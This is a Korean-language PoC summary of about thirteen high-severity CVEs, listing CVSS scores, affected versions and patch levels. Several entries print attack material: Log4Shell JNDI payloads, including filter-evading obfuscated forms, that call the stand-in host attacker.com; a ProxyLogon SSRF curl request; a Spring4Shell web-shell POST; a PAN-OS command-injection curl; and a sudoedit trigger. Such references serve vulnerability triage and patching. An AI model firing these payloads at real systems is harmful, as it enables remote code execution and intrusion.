# 고위험 CVE — PoC 요약

## CVE-2021-44228 — Log4Shell (Log4j RCE)
```
CVSS: 10.0 | 영향: Java 애플리케이션 전반
페이로드:
  ${jndi:ldap://attacker.com:1389/a}
  ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
  ${jndi:dns://attacker.com/a}
  ${${lower:j}ndi:${lower:l}dap://attacker.com/a}
탐지 위치: HTTP 헤더 (User-Agent, X-Forwarded-For, X-Api-Version 등)
패치: Log4j 2.17.1+
```

## CVE-2021-26855 — ProxyLogon (Exchange SSRF→RCE)
```
CVSS: 9.8 | 영향: Microsoft Exchange Server
SSRF → RCE 체인
curl -k "https://exchange/owa/auth/x.js" -X POST \
  --header "Cookie: X-BEResource=admin@target/EWS/Exchange.asmx?~3;" \
  -d "..."
패치: 2021년 3월 긴급패치
```

## CVE-2022-22965 — Spring4Shell (Spring RCE)
```
CVSS: 9.8 | 영향: Spring Framework 5.3.x < 5.3.18
POST /app HTTP/1.1
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B...%7D
패치: Spring Framework 5.3.18+
```

## CVE-2023-44487 — HTTP/2 Rapid Reset (DDoS)
```
CVSS: 7.5 | 영향: HTTP/2 서버 전반 (Nginx, Apache, AWS 등)
대규모 HTTP/2 요청 → RST_STREAM 반복으로 서버 마비
패치: Nginx 1.25.3+, Apache 2.4.58+
```

## CVE-2024-3400 — Palo Alto PAN-OS RCE
```
CVSS: 10.0 | 영향: PAN-OS GlobalProtect Gateway
curl -H "SESSID: /../../../opt/panlogs/tmp/device_telemetry/hour/aaa`id`" \
  "https://target/ssl-vpn/hipreport.esp"
패치: PAN-OS 11.1.2-h3+, 11.0.4-h1+, 10.2.9-h1+
```

## CVE-2024-6387 — regreSSHion (OpenSSH RCE)
```
CVSS: 8.1 | 영향: OpenSSH < 9.8p1 (glibc Linux)
Signal handler race condition → unauthenticated RCE as root
패치: OpenSSH 9.8p1+
```

## CVE-2024-21762 — Fortinet FortiOS RCE
```
CVSS: 9.8 | 영향: FortiOS 7.0-7.4, FortiProxy
Out-of-bound write via specially crafted HTTP request
패치: FortiOS 7.4.3+, 7.2.7+, 7.0.14+
```

## CVE-2024-1709 — ConnectWise ScreenConnect Auth Bypass
```
CVSS: 10.0 | 영향: ScreenConnect < 23.9.8
/SetupWizard.aspx 에 접근해 관리자 계정 생성
→ 원격 코드 실행 가능
패치: 23.9.8+
```

## CVE-2024-27198 — JetBrains TeamCity Auth Bypass
```
CVSS: 9.8 | 영향: TeamCity < 2023.11.4
/app/rest/server 엔드포인트 인증 우회
→ 관리자 토큰 생성 → RCE
패치: TeamCity 2023.11.4+
```

## CVE-2023-46604 — Apache ActiveMQ RCE
```
CVSS: 10.0 | 영향: Apache ActiveMQ < 5.15.16, 5.16.7, 5.17.6, 5.18.3
ClassPathXmlApplicationContext 를 통한 원격 ClassInfo 로드 → RCE
포트: 61616 (OpenWire 프로토콜)
패치: 5.15.16+, 5.16.7+, 5.17.6+, 5.18.3+
```

## CVE-2023-34362 — MOVEit Transfer SQLi → RCE
```
CVSS: 9.8 | 영향: Progress MOVEit Transfer < 2023.0.1
/human.aspx 엔드포인트 SQL Injection → 파일 접근 → 시스템 접근
CL0P 랜섬웨어 그룹 대규모 악용
패치: 2023.0.1+
```

## CVE-2022-0847 — Dirty Pipe (Linux LPE)
```
CVSS: 7.8 | 영향: Linux Kernel 5.8 ~ 5.16.11, 5.15.25, 5.10.102
파이프 플래그의 초기화 오류 → 권한 없는 파일 덮어쓰기 → LPE
PoC: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
패치: 5.16.11+, 5.15.25+, 5.10.102+
```

## CVE-2021-3156 — Sudo Baron Samedit (LPE)
```
CVSS: 7.8 | 영향: Sudo 1.8.2 ~ 1.9.5p1
힙 기반 버퍼 오버플로우 → root 권한 상승
sudoedit -s '\' 로 트리거
패치: 1.9.5p2+
```
